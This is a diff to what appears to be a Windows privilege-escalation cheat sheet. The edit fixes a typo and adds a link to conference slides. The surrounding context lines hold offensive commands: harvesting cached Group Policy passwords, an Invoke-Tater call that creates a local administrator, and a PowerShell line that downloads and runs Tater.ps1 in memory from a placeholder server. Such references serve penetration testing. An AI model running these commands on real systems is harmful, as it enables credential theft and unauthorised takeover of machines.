@@ -299,7 +299,7 @@ present passwords.
 Get-CachedGPPPassword
 ```
 
-The following commands can be used to conduct the search mannually:
+The following commands can be used to conduct the search manually:
 
 ```
 $AllUsers = $Env:ALLUSERSPROFILE
@@ -1100,6 +1100,10 @@ Invoke-Tater -Command "net user <USERNAME> <PASSWORD> /add && net localgroup adm
 # Memory injection and run
 powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://<WEBSERVER_IP>:<WEBSERVER_PORT>/Tater.ps1'); Invoke-Tater -Command <POWERSHELLCMD>;
 ```
+
+###### TODO
+
+https://2018.romhack.io/slides/RomHack%202018%20-%20Andrea%20Pierini%20-%20whoami%20priv%20-%20show%20me%20your%20Windows%20privileges%20and%20I%20will%20lead%20you%20to%20SYSTEM.pdf
 
 --------------------------------------------------------------------------------
 ### Windows Subsystem for Linux (WSL) - TODO
